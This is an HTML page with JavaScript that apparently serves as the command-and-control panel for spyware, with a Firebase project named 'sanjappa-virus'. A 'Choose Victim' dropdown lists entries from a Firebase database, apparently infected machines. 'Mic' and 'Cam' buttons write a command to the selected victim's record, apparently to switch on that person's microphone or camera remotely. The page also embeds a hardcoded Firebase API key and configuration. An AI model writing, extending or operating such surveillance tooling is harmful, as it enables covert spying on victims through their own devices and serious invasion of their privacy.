<!DOCTYPE html>
<html>
    <head>
        <style>
            *{
                margin: 5PX;
            }
            body{
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
        </style>
    </head>
    <body>

        <div>

            <div class="select-wrap">
                <label for="desktop">Choose Victim</label>
    
                <select name="desktop" oninput="setbucket(this.value)" id="desktop">


                </select>

            </div>
            <div class="buttons-section">
                <button onclick="setData('mic')">Mic</button>
                <button onclick="setData('cam')">Cam</button>
            </div>
        </div>


        <script src="https://www.gstatic.com/firebasejs/8.2.4/firebase-app.js"></script>
        <script src="https://www.gstatic.com/firebasejs/8.2.4/firebase-auth.js"></script>
        <script src="https://www.gstatic.com/firebasejs/8.2.4/firebase-database.js"></script>

        <script>
            var bucket;
            var firebaseConfig = {
                apiKey: "AIzaSyBjv6FEMCXtOJjNCZZIUGWHC1bze2dX8YM",
                authDomain: "sanjappa-virus.firebaseapp.com",
                databaseURL: "https://sanjappa-virus-default-rtdb.firebaseio.com",
                projectId: "sanjappa-virus",
                storageBucket: "sanjappa-virus.appspot.com",
                messagingSenderId: "845505154059",
                appId: "1:845505154059:web:0bdf1d87bdfa1328a00b0e"
            };
            firebase.initializeApp(firebaseConfig);

            firebase.database().ref('/').once('value', function (snapshot) {

                var array = snapshot.val();
                var keys = Object.keys(array);
                bucket = keys[0]

                const posts = Object.keys(array).map(p => 
                    `<option value=${p}>${p}</option>`
                )
                console.log(posts)
        
                document.getElementById('desktop').innerHTML = posts.join('')
            
             });

            function setData(stringkey){
                firebase.database().ref(bucket).set({
                    key : stringkey
                })
            }

            function setbucket(lol){
                bucket = lol;
            }
        </script>
    </body>
</html>
